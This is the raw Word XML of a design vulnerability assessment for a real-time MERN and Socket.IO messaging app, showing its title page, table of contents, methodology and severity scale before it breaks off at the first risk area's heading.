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5970" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FEDDA15" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02D4260C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC43DFD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="468AE7C5" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59EA4306" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B1A263C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="646464"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Real-Time Instant Messaging System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0539723D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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 w14:paraId="07E0489C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2C3E50"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>Critical &amp; High-Risk Areas of the Design</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424E2FDC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Design Vulnerability Assessment &amp; Mitigation Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8EE4AF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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 w14:paraId="20E7FEA5" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F20B716" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="251CBB35" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A46AF9A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64CB8E7F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="400"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="646464"/>
        </w:rPr>
        <w:t>MERN Stack (MongoDB, Express.js, React, Node.js) + Socket.IO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37FC1CA2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE34652" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="240"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2C3E50"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49471EE6" w14:textId="4A08E229" w:rsidR="000C00CB" w:rsidRDefault="00000000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065702" w:history="1">
        <w:r w:rsidR="000C00CB" w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1. Introduction</w:t>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc240065702 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="000C00CB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="48793166" w14:textId="11266F81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03" w:history="1">
        <w:r w:rsidRPr="00720863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68F9B5" w14:textId="62994169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04" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.2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4084ED" w14:textId="4142FC60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05" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.3 Severity Classification Scale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38286D" w14:textId="3270FEFC" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065706" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2. Risk Area 1: Authentication &amp; Session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73BD82" w14:textId="05D0F83F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07" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.1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39EAE3" w14:textId="1D23FC63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08" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.2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F4C4F5" w14:textId="05676C30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09" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.3 Threat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34B137" w14:textId="0F68A2C1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10" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.4 Current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7F4605" w14:textId="6140BDA0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11" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.5 Recommended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AE331D" w14:textId="1A501540" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065712" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3. Risk Area 2: Socket.IO Event Integrity &amp;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EBBEC5" w14:textId="33FE177C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13" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.1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02603C" w14:textId="326E9AE1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14" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.2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32C161" w14:textId="09CF2571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15" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.3 Threat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316914" w14:textId="1A7B15F9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16" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.4 Current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98D8A3" w14:textId="3E9023E0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17" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.5 Recommended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BBE425" w14:textId="02190936" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065718" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4. Risk Area 3: In-Memory State Volatility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2C2DBE" w14:textId="61326D33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19" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.1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E3A4BF" w14:textId="5DF1B90C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20" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.2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33FB3D" w14:textId="5D1651EE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21" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.3 Threat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3A5AC8" w14:textId="2E8909CF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22" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.4 Impact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B97BCD" w14:textId="69134847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23" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.5 Current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CF5CCF" w14:textId="662A8B21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24" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.6 Recommended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285C46" w14:textId="6E12A769" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065725" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5. Risk Area 4: Data Integrity &amp; Consistency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68B2A3" w14:textId="03BBAF26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26" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5.1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99DC73" w14:textId="3B735268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27" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5.2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AAFB52" w14:textId="2AEBC73D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28" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5.3 Threat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7866EE" w14:textId="719D8FA1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29" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5.4 Current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11B944" w14:textId="31113178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30" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5.5 Recommended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FD2278" w14:textId="4BDE1910" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065731" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6. Risk Area 5: Scalability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203B59" w14:textId="6281AC1E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32" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6.1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919296" w14:textId="6BDC221F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33" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6.2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B14262" w14:textId="20FF151A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34" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6.3 Scaling Ceiling Estimates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4C84CA" w14:textId="4EEB893F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35" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6.4 Current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8F1564" w14:textId="55C987CA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36" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6.5 Recommended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349FA0" w14:textId="3F4AC6D8" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065737" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>7. Risk Area 6: Input Validation &amp; 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DCB888" w14:textId="4D7D9B9E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38" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>7.1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A0198A" w14:textId="1B0578C0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39" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>7.2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009EB2" w14:textId="6A672B16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40" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>7.3 Current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D4EB28" w14:textId="20FA2909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41" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>7.4 Recommended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4E24DC" w14:textId="329DE855" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065742" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>8. Risk Summary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E90920" w14:textId="29A4CE66" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065743" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>9. Prioritized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0FFE8B" w14:textId="2D65EF1D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44" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>9.1 Immediate Priority (Security-Critical)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A50651" w14:textId="31BB6E28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45" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>9.2 High Priority (Data Protection)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F039E1" w14:textId="39C4F6CF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46" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>9.3 Medium Priority (Resilience &amp; Performance)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1E92829" w14:textId="49421E00" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065747" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>9.4 Low Priority (Hardening)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B661F1" w14:textId="0C06C4D6" w:rsidR="000C00CB" w:rsidRDefault="000C00CB">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc240065748" w:history="1">
        <w:r w:rsidRPr="00720863">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>10.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0D9EF6" w14:textId="37D84B79" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C984823" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="291461D3" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Deliverable: Critical Risk Analysis &amp; Design Vulnerability Assessment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF99FEA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>System Under Analysis: Real-Time Instant Messaging Application (MERN Stack with WebSockets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7899B1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Scope: Identification, analysis, and mitigation recommendations for high-risk architectural and implementation decisions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79ACF24A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc240065702"/>
      <w:r>
        <w:t>1. Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="7AD7FCA9" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc240065703"/>
      <w:r>
        <w:t>1.1 Purpose</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="4B04E24B" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This document identifies and formally analyzes the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>critical and high-risk areas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> within the Instant Messaging (IM) system's architecture and implementation. The objective is to demonstrate awareness of design trade-offs, document known vulnerabilities, assess their potential impact, and propose targeted mitigation strategies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156A3DAD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc240065704"/>
      <w:r>
        <w:t>1.2 Methodology</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="27CCD4F0" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Each risk area is analyzed using the following structured framework:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7811D2C7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Identification:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Description of the vulnerable component or design decision. 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Specific code references and implementation patterns that exhibit the risk. 3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Threat Scenario:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Concrete attack vectors or failure modes that could exploit the vulnerability. 4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Impact Assessment:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Severity classification based on Likelihood × Impact. 5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Current Mitigation:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Any existing safeguards already present in the codebase. 6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recommended Mitigation:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Proposed improvements to reduce or eliminate the risk.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED00318" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc240065705"/>
      <w:r>
        <w:t>1.3 Severity Classification Scale</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/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B2F5B" w14:paraId="1367D51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6D1391A6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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22C776A8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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591FCD7E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000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341B3909" w14:textId="77777777" w:rsidR="00CB2F5B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B2F5B" w14:paraId="2C9404B1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1662CB2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🔴 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical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7CD66A2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DE710A5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7661D5" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Immediate threat to data integrity or security; exploitation is straightforward</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="6341C2C2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584CBBF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟠 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High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289493D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium-High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37CB5D63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FCA6999" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Significant threat requiring active exploitation; can cause major damage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="789B1EC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CD984CF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟡 </w:t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FC8EE76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71090D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74E5A8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Degradation of service or data quality under specific conditions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="4E699EE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1F84301" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">🟢 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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C2F7CAA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low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4CE76FA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low-Medium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FB719E8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Minor inconvenience; mitigated by existing framework defaults</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="450160DA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="60ED64BC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc240065706"/>
      <w:r>
        <w:t>2. Risk Area 1: Authentication &amp; Session Security</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="0E3E5C76" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity: 🟠 HIGH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096DDE62" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
